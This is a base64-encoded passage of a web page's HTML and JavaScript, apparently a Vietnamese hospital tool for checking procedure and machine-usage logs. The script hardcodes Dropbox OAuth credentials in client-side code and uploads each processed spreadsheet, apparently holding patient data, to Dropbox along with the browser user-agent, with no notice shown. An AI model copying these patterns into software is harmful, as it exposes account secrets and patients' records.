QXZhaWxhYmlsaXR5KCkiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPkdp4budIHRy4buRbmc8L2J1dHRvbj4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9InBhdGllbnRMaXN0QnRuIiBvbmNsaWNrPSJvcGVuUGF0aWVudExpc3QoKSIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+RGFuaCBzw6FjaCBi4buHbmggbmjDom48L2J1dHRvbj4NCjxkaXYgaWQ9ImF2YWlsYWJpbGl0eVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLWJvdHRvbTogMjBweDsiPg0KIDxkaXYgY2xhc3M9Im1haW5ibG9rIiBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsgZGlzcGxheTpub25lOyIgaWQ9ImF2YWlsYWJpbGl0eUZpbHRlckJsb2NrIj4NCiAgPGxhYmVsIGZvcj0iZmlsdGVyT3BlcmF0b3IiPk5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCiAgPHNlbGVjdCBpZD0iZmlsdGVyT3BlcmF0b3IiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87bWFyZ2luLXJpZ2h0OjIwcHg7Ij48L3NlbGVjdD4NCg0KICA8bGFiZWwgZm9yPSJmaWx0ZXJEYXRlIj5OZ8OgeTo8L2xhYmVsPg0KICA8c2VsZWN0IGlkPSJmaWx0ZXJEYXRlIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvOyI+PC9zZWxlY3Q+DQo8L2Rpdj4NCg0KICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIGhlcmItdGFibGUiPg0KICAgIDx0aGVhZD4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICANCiAgICAgICAgPHRoPktodW5nIGdp4budIHRy4buRbmcgYnXhu5VpIHPDoW5nPC90aD4NCiAgICAgICAgPHRoPktodW5nIGdp4budIHRy4buRbmcgYnXhu5VpIGNoaeG7gXU8L3RoPg0KICAgICAgPC90cj4NCiAgICA8L3RoZWFkPg0KICAgIDx0Ym9keSBpZD0iYXZhaWxhYmlsaXR5Qm9keSI+PC90Ym9keT4NCiAgPC90YWJsZT4NCjwvZGl2Pg0KPCEtLSBL4bq+VCBUSMOaQzogQuG6ok5HIEdJ4bucIFRS4buQTkcgVOG7qk5HIE5Hxq/hu5xJIC0tPg0KDQoNCg0KDQo8IS0tIE7DmlQgSEnhu4JOIFRI4buKIFRI4bumIFRIVeG6rFQgU+G6rkMgVEhV4buQQyAtLT4NCg0KDQogIA0KPCEtLSBC4bqiTkcgVEjhu6YgVEhV4bqsVCBT4bquQyBUSFXhu5BDIFRIQU5HIC0tPg0KPGRpdiBpZD0iaGVyYlByb2NlZHVyZVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLXRvcDogMjBweDsiPg0KICA8ZGl2IGNsYXNzPSJtYWluYmxvayJzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsiPg0KICAgIDxkaXY+DQogICAgPHNlbGVjdCBpZD0iaGVyYkRvY3RvckZpbHRlciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsgbWFyZ2luLWxlZnQ6IDIwcHg7Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBiw6FjIHPEqTwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICAgIDxzZWxlY3QgaWQ9ImhlcmJEYXRlRmlsdGVyIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvOyI+PC9zZWxlY3Q+DQogIDwvZGl2PjwvZGl2Pg0KDQo8IS0tIFTDk00gVOG6rlQgT1VUTElFUiAtLT4NCjxkaXYgaWQ9ImhlcmJPdXRsaWVyU3VtbWFyeSIgc3R5bGU9ImRpc3BsYXk6bm9uZTttYXJnaW46OHB4IDIwcHg7Zm9udC1zaXplOjE0cHgiPg0KICA8IS0tIG7hu5lpIGR1bmcgc+G6vSDEkcaw4bujYyBKUyBj4bqtcCBuaOG6rXQgLS0+DQo8L2Rpdj4NCiAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgPHRoZWFkPg0KICAgICAgPHRyPg0KICAgICAgICA8dGg+SOG7jSB0w6puIGLhu4duaCBuaMOibjwvdGg+DQogICAgICAgIDx0aD5UaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgPHRoPlRo4budaSBnaWFuPC90aD4NCiAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgPC90cj4NCiAgICA8L3RoZWFkPg0KICAgIDx0Ym9keSBpZD0iaGVyYlRhYmxlQm9keSI+PC90Ym9keT4NCiAgPC90YWJsZT4NCjwvZGl2Pg0KDQoNCjwhLS0gUE9QVVAgREFOSCBTw4FDSCBPVVRMSUVSIFPhuq5DIFRIVeG7kEMgVEhBTkcgLS0+DQo8ZGl2IGlkPSJoZXJiT3V0bGllck1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTAwMCI+DQogIDxkaXYgaWQ9ImhlcmJPdXRsaWVyQmFja2Ryb3AiIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIj48L2Rpdj4NCiAgPGRpdiByb2xlPSJkaWFsb2ciIGFyaWEtbW9kYWw9InRydWUiDQogICAgICAgY2xhc3M9Im1vZGFsLWJhc2UgbW9kYWwtbGFyZ2UiPg0KICAgIDxoMz5EYW5oIHPDoWNoIGNhIGtow6FjIMSRYSBz4buRPC9oMz4NCiAgICA8ZGl2IHN0eWxlPSJtYXJnaW46MTBweCAwO2ZvbnQtc2l6ZToxM3B4IiBpZD0iaGVyYk91dGxpZXJNb2RhbEluZm8iPjwvZGl2Pg0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiIHN0eWxlPSJtYXJnaW4tdG9wOjEwcHgiPg0KICAgICAgPHRoZWFkPg0KICAgICAgICA8dHI+DQogICAgICAgICAgPHRoPkjhu40gdMOqbiBi4buHbmggbmjDom48L3RoPg0KICAgICAgICAgIDx0aD5UaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICAgIDx0aD5UaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICA8L3RyPg0KICAgICAgPC90aGVhZD4NCiAgICAgIDx0Ym9keSBpZD0iaGVyYk91dGxpZXJNb2RhbEJvZHkiPjwvdGJvZHk+DQogICAgPC90YWJsZT4NCiAgICA8YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgdHlwZT0iYnV0dG9uIiBpZD0iaGVyYk91dGxpZXJDbG9zZUJ0biI+xJDDs25nPC9idXR0b24+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCg0KDQoNCg0KDQo8YnIvPg0KPGJyLz4NCg0KDQo8ZGl2IGlkPSJlcnJvclNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQo8YnIvPg0KPGgzIGlkPSJlcnJvclNlY3Rpb25UaXRsZSI+TOG7l2kgTmjhuq1wIFNhaSBUaOG7nWkgR2lhbjwvaDM+DQo8ZGl2IGlkPSJvcGVyYXRvckZpbHRlckVycm9yIiBzdHlsZT0ibWFyZ2luLXRvcDogMTVweDsgZGlzcGxheTogbm9uZTsiPg0KPGxhYmVsIGZvcj0ib3BlcmF0b3JTZWxlY3RFcnJvciI+TOG7jWMgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQo8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im9wZXJhdG9yU2VsZWN0RXJyb3IiPg0KPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQo8L3NlbGVjdD4NCjwvZGl2Pg0KPGRpdiBpZD0iZXJyb3JMb2ciPjwvZGl2Pg0KPC9kaXY+DQo8YnIvPg0KDQo8ZGl2IGlkPSJyZXN1bHRTZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KPGgzIGlkPSJyZXN1bHRTZWN0aW9uVGl0bGUiPlRyw7luZyBHaeG7nTwvaDM+IA0KDQo8ZGl2IGlkPSJvcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCjxsYWJlbCBmb3I9Im9wZXJhdG9yU2VsZWN0Ij5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCjxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ib3BlcmF0b3JTZWxlY3QiPg0KPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQo8L3NlbGVjdD4NCjwvZGl2Pjxici8+DQoNCjx0YWJsZSBpZD0icmVzdWx0VGFibGUiPg0KPHRoZWFkPg0KPHRyPg0KPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCjx0aD48aSBjbGFzcz0iZmFyIGZhLWNhbGVuZGFyLWFsdCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfDoHk8L3RoPg0KPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCjx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEfhu6NpIMO9IGdp4budPC90aD4NCjwvdHI+DQo8L3RoZWFkPg0KPHRib2R5IGlkPSJyZXN1bHRCb2R5Ij48L3Rib2R5Pg0KPC90YWJsZT4NCg0KDQo8L2Rpdj4NCjwhLS0gQuG6ok5HIEfhuq5OIFNBSSBNw4FZIC0tPg0KPGRpdiBpZD0ibWFjaGluZUVycm9yU2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgPGJyLz4NCiAgPGgzIGlkPSJtYWNoaW5lRXJyb3JTZWN0aW9uVGl0bGUiPkfhuq9uIFNhaSBNw6MgTcOheTwvaDM+DQogIDxkaXYgaWQ9Im1hY2hpbmVPcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCiAgICA8bGFiZWwgZm9yPSJtYWNoaW5lT3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KICAgIDxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ibWFjaGluZU9wZXJhdG9yU2VsZWN0Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICA8L2Rpdj4NCiAgPGRpdiBpZD0ibWFjaGluZUVycm9yTG9nIj48L2Rpdj4NCjwvZGl2Pg0KPGJyLz4NCg0KPCEtLSBC4bqiTkcgWFVORyDEkOG7mFQgTcOBWSAtLT4NCjxkaXYgaWQ9Im1hY2hpbmVDb25mbGljdFNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogIDxici8+DQogIDxoMyBpZD0ibWFjaGluZUNvbmZsaWN0U2VjdGlvblRpdGxlIj5YdW5nIMSQ4buZdCBNw6F5PC9oMz4NCiAgPGRpdiBpZD0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQogICAgPGxhYmVsIGZvcj0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KICAgIDxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogIDwvZGl2Pg0KICA8ZGl2IGlkPSJtYWNoaW5lQ29uZmxpY3RMb2ciPjwvZGl2Pg0KPC9kaXY+DQo8YnIvPg0KPCEtLSBC4bqiTkcgUVXDik4gR+G6rk4gTcODIE3DgVkgLS0+DQo8ZGl2IGlkPSJtaXNzaW5nTWFjaGluZVNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogIDxici8+DQogIDxoMyBpZD0ibWlzc2luZ01hY2hpbmVTZWN0aW9uVGl0bGUiPlF1w6puIEfhuq9uIE3DoyBNw6F5PC9oMz4NCiAgPGRpdiBpZD0ibWlzc2luZ01hY2hpbmVPcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCiAgICA8bGFiZWwgZm9yPSJtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0Ij5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCiAgICA8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im1pc3NpbmdNYWNoaW5lT3BlcmF0b3JTZWxlY3QiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogIDwvZGl2Pg0KICA8ZGl2IGlkPSJtaXNzaW5nTWFjaGluZUxvZyI+PC9kaXY+DQo8L2Rpdj4NCjxici8+DQoNCjwhLS0gQuG6ok5HIFRI4bucSSBHSUFOIELhuq5UIMSQ4bqmVSBLSMOBQyBOR8OAWSBUSOG7sEMgSEnhu4ZOIC0tPg0KPGRpdiBpZD0iZGF0ZU1pc21hdGNoU2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgPGJyLz4NCiAgPGgzIGlkPSJkYXRlTWlzbWF0Y2hTZWN0aW9uVGl0bGUiPlRo4budaSBHaWFuIFkgTOG7h25oIEtow6FjIFRo4budaSBHaWFuIFRo4buxYyBIaeG7h248L2gzPg0KICA8ZGl2IGlkPSJkYXRlTWlzbWF0Y2hPcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCiAgICA8bGFiZWwgZm9yPSJkYXRlTWlzbWF0Y2hPcGVyYXRvclNlbGVjdCI+TOG7jWMgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQogICAgPHNlbGVjdCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJkYXRlTWlzbWF0Y2hPcGVyYXRvclNlbGVjdCI+DQogICAgICA8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgPC9kaXY+DQogIDxkaXYgaWQ9ImRhdGVNaXNtYXRjaExvZyI+PC9kaXY+DQo8L2Rpdj4NCjxici8+DQo8L2Rpdj4NCjwvZGl2Pg0KPHNjcmlwdD4NCi8vIFThuqNpIFhMU1ggY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVYTFNYKCkgew0KICBpZiAoIXdpbmRvdy5YTFNYKSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy94bHN4LzAuMTguNS94bHN4LmZ1bGwubWluLmpzJyk7DQogIH0NCn0NCg0KLy8gVOG6o2kgRHJvcGJveCBTREsgY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVEcm9wYm94KCkgew0KICBpZiAoIXdpbmRvdy5Ecm9wYm94KSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL3VucGtnLmNvbS9kcm9wYm94L2Rpc3QvRHJvcGJveC1zZGsubWluLmpzJyk7DQogIH0NCn0NCg0KDQogICAgICAgIC8vIERhbmggc8OhY2ggdGjhu6cgdGh14bqtdA0KICAgICAgIGxldCBQUk9DRURVUkVTID0ge307DQoNCmFzeW5jIGZ1bmN0aW9uIGxvYWRQcm9jZWR1cmVzKCkgew0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV90aHV0aHVhdC50eHQnKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIFBST0NFRFVSRVMgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICBhbGVydCgnS2jDtG5nIHRo4buDIHThuqNpIGRhbmggc8OhY2ggdGjhu6cgdGh14bqtdDogJyArIGVyci5tZXNzYWdlKTsNCiAgICAgICAgY29uc29sZS5lcnJvcihlcnIpOw0KICAgIH0NCn0NCg0KCQkNCg0KICAgICAgICAvLyBCaeG6v24gdG/DoG4gY+G7pWMNCiAgICAgICAgbGV0IGVycm9yTG9nID0gW107DQogICAgICAgIGxldCBjdXJyZW50VXNlciA9IG51bGw7DQogICAgICAgIGxldCBhbGxQcm9jZWR1cmVzID0gW107DQogICAgICAgLy8gQmnhur9uIGNobyBraeG7g20gdHJhIG3DoXkNCiAgICAgICAgbGV0IG1hY2hpbmVFcnJvckxvZyA9IFtdOw0KICAgICAgICBsZXQgbWFjaGluZUNvbmZsaWN0TG9nID0gW107DQoJCWxldCBtaXNzaW5nTWFjaGluZUxvZyA9IFtdOw0KCQlsZXQgZGF0ZU1pc21hdGNoTG9nID0gW107DQogICAgICAgIC8vID09PSBL4bq+VCBUSMOaQyBDT0RFIE3hu5pJID09PQ0KDQpjb25zdCBEUk9QQk9YX0NPTkZJRyA9IHsNCiAgICByZWZyZXNoVG9rZW46ICJjdGdCdmozSXN0Y0FBQUFBQUFBQUFWRkNzSVhJdXpfQ1RRcEltYWtjQzRjdVFWOER1bWtmZ0RXSXM4VkdQdkZUIiwNCiAgICBjbGllbnRJZDogInc4YXdqMnF4bzNhaXY1ZSIsDQogICAgY2xpZW50U2VjcmV0OiAicWtxbzF1N2F0czdibDlnIg0KfTsNCg0KYXN5bmMgZnVuY3Rpb24gZ2V0QWNjZXNzVG9rZW4oKSB7DQogICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgiaHR0cHM6Ly9hcGkuZHJvcGJveGFwaS5jb20vb2F1dGgyL3Rva2VuIiwgew0KICAgICAgICBtZXRob2Q6ICJQT1NUIiwNCiAgICAgICAgaGVhZGVyczogew0KICAgICAgICAgICAgIkF1dGhvcml6YXRpb24iOiAiQmFzaWMgIiArIGJ0b2EoYCR7RFJPUEJPWF9DT05GSUcuY2xpZW50SWR9OiR7RFJPUEJPWF9DT05GSUcuY2xpZW50U2VjcmV0fWApLA0KICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiDQogICAgICAgIH0sDQogICAgICAgIGJvZHk6IGBncmFudF90eXBlPXJlZnJlc2hfdG9rZW4mcmVmcmVzaF90b2tlbj0ke0RST1BCT1hfQ09ORklHLnJlZnJlc2hUb2tlbn1gDQogICAgfSk7DQogICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsNCiAgICByZXR1cm4gZGF0YS5hY2Nlc3NfdG9rZW47DQp9DQovLyBU4bqjaSBYTFNYIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlWExTWCgpIHsNCiAgaWYgKCF3aW5kb3cuWExTWCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMveGxzeC8wLjE4LjUveGxzeC5mdWxsLm1pbi5qcycpOw0KICB9DQp9DQoNCi8vIFThuqNpIERyb3Bib3ggU0RLIGNo4buJIGtoaSBj4bqnbg0KYXN5bmMgZnVuY3Rpb24gZW5zdXJlRHJvcGJveCgpIHsNCiAgaWYgKCF3aW5kb3cuRHJvcGJveCkgew0KICAgIGF3YWl0IGltcG9ydCgnaHR0cHM6Ly91bnBrZy5jb20vZHJvcGJveC9kaXN0L0Ryb3Bib3gtc2RrLm1pbi5qcycpOw0KICB9DQp9DQphc3luYyBmdW5jdGlvbiB1cGxvYWRUb0Ryb3Bib3goZmlsZSwga2hvYVZhbHVlLCBuZ2F5VmFsdWUsIHN0YXRzID0geyBoZXJiOiAwLCB0aW1lOiAwLCBjb25mbGljdDogMCB9KSB7DQogY29uc3QgY3VycmVudFVzZXIgPSBzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJyk7DQogIGlmIChjdXJyZW50VXNlciAmJiBjdXJyZW50VXNlci50b0xvd2VyQ2FzZSgpID09PSAnZG9jdG9yJykgew0KICAgIHJldHVybjsgDQogIH0NCiAgYXdhaXQgZW5zdXJlRHJvcGJveCgpOyAvLyDEkeG6o20gYuG6o28gY8OzIERyb3Bib3ggU0RLDQogICAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICAgIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCg0KICAgIGNvbnN0IHBjTmFtZSA9IG5hdmlnYXRvci51c2VyQWdlbnQ7DQogICAgY29uc3Qgbm93ID0gbmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygndmktVk4nKTsNCiAgICBjb25zdCBmaWxlbmFtZSA9IGAke2ZpbGUubmFtZS5yZXBsYWNlKC9cLlteLy5dKyQvLCAiIil9XyR7RGF0ZS5ub3coKX0ueGxzeGA7DQoNCiAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGRieC5maWxlc1VwbG9hZCh7DQogICAgICAgIHBhdGg6IGAvdGh1dGh1YXQvJHtmaWxlbmFtZX1gLA0KICAgICAgICBjb250ZW50czogZmlsZSwNCiAgICAgICAgbW9kZTogJ2FkZCcsDQogICAgICAgIGF1dG9yZW5hbWU6IHRydWUNCiAgICB9KTsNCg0KICAgIC8vIEdoaSBtZXRhZGF0YSB2w6BvIGZpbGUgSlNPTiB0cnVuZyB0w6JtIChk4bqhbmcgdGV4dCBhcHBlbmQpDQogICAgY29uc3QgbWV0YWRhdGEgPSB7DQogICAgICAgIHN0dDogRGF0ZS5ub3coKSwNCiAgICBraG9hOiBraG9hVmFsdWUsICAgICAgICAvLyDinIUgxJHDum5nIGJp4bq/bg0KICAgIG5nYXk6IG5nYXlWYWx1ZSwgICAgLy8g4pyFIMSRw7puZyBiaeG6v24NCiAgICAgICAgbGluazogImh0dHBzOi8vd3d3LmRyb3Bib3guY29tL2hvbWUvdGh1dGh1YXQ/cHJldmlldz0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGZpbGVuYW1lKSwNCiAgICAgICAgcGM6IHBjTmFtZSwNCiAgICAgICAgdGltZTogbm93LA0KCQloZXJiX2Vycm9yczogTnVtYmVyKHN0YXRzLmhlcmIpIHx8IDAsDQogICAgdGltZV9lcnJvcnM6IE51bWJlcihzdGF0cy50aW1lKSB8fCAwLA0KICAgY29uZmxpY3RfZXJyb3JzOiBOdW1iZXIoc3RhdHMuY29uZmxpY3QpIHx8IDANCiAgICB9Ow0KDQogICAgYXdhaXQgYXBwZW5kRHJvcGJveExvZyhtZXRhZGF0YSk7DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIGFwcGVuZERyb3Bib3hMb2cobG9nSXRlbSkgew0KICAgIGNvbnN0IGFjY2Vzc1Rva2VuID0gYXdhaXQgZ2V0QWNjZXNzVG9rZW4oKTsNCiAgICBjb25zdCBkYnggPSBuZXcgRHJvcGJveC5Ecm9wYm94KHsgYWNjZXNzVG9rZW4gfSk7DQoNCiAgICBjb25zdCBsb2dQYXRoID0gJy90aHV0aHVhdC9sb2cuanNvbic7DQogICAgbGV0IGxvZ3MgPSBbXTsNCg0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZGJ4LmZpbGVzRG93bmxvYWQoeyBwYXRoOiBsb2dQYXRoIH0pOw0KICAgICAgICBjb25zdCBibG9iID0gcmVzcG9uc2UucmVzdWx0LmZpbGVCbG9iOyAvLyDinIUgZMO5bmcgLnJlc3VsdC5maWxlQmxvYg0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgYmxvYi50ZXh0KCk7DQogICAgICAgIGxvZ3MgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgY29uc29sZS53YXJuKCJLaMO0bmcgdMOsbSB0aOG6pXkgbG9nLmpzb24gY8WpIGhv4bq3YyBs4buXaSDEkeG7jWM6IiwgZSk7DQogICAgICAgIGxvZ3MgPSBbXTsNCiAgICB9DQoNCiAgICAvLyBDaMOobiBt4bubaSBuaOG6pXQgbMOqbiDEkeG6p3UNCiAgICBsb2dzLnVuc2hpZnQobG9nSXRlbSk7DQoNCiAgICBhd2FpdCBkYnguZmlsZXNVcGxvYWQoew0KICAgICAgICBwYXRoOiBsb2dQYXRoLA0KICAgICAgICBjb250ZW50czogSlNPTi5zdHJpbmdpZnkobG9ncywgbnVsbCwgMiksDQogICAgICAgIG1vZGU6IHsgJy50YWcnOiAnb3ZlcndyaXRlJyB9LCAvLyDinIUgR2hpIMSRw6ggYuG6r3QgYnXhu5ljDQogICAgICAgIGF1dG9yZW5hbWU6IGZhbHNlDQogICAgfSk7DQp9DQoNCg0KYXN5bmMgZnVuY3Rpb24gaW5pdEFmdGVyTG9naW4oKSB7DQogIGF3YWl0IFByb21pc2UuYWxsKFsNCiAgICBsb2FkUHJvY2VkdXJlcygpLA0KICAgIGxvYWRDb25mbGljdFJ1bGVzKCkNCiAgXSk7DQp9DQoNCg0KDQogICAgICAgIC8vID09PT09PT09PT0gUEjhuqZOIMSQxIJORyBOSOG6rFAgPT09PT09PT09PSAvLw0KYXN5bmMgZnVuY3Rpb24gY2hlY2tTYXZlZExvZ2luKCkgew0KICAgIGNvbnN0IHNhdmVkVXNlciA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKTsNCiAgICBpZiAoc2F2ZWRVc2VyKSB7DQogICAgICAgIGN1cnJlbnRVc2VyID0gc2F2ZWRVc2VyOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgIGluaXRBZnRlckxvZ2luKCk7IC8vIGF1dG8tbG9naW4gbeG7m2kgbG9hZCBk4buvIGxp4buHdQ0KICAgIH0NCn0NCg0KbGV0IGlzTG9naW5BY3Rpb24gPSBmYWxzZTsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCmxldCBhbmFseXplUG9wdXBUaW1lcjsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCmFzeW5jIGZ1bmN0aW9uIGNoZWNrTG9naW4oKSB7DQogIGNvbnN0IGJ0bkxvZ2luICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5CdG4nKTsNCiAgY29uc3QgdXNlcm5hbWUgICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUudHJpbSgpOw0KICBjb25zdCBwYXNzd29yZCAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZS50cmltKCk7DQogIGNvbnN0IGxvZ2luRXJyb3IgPSB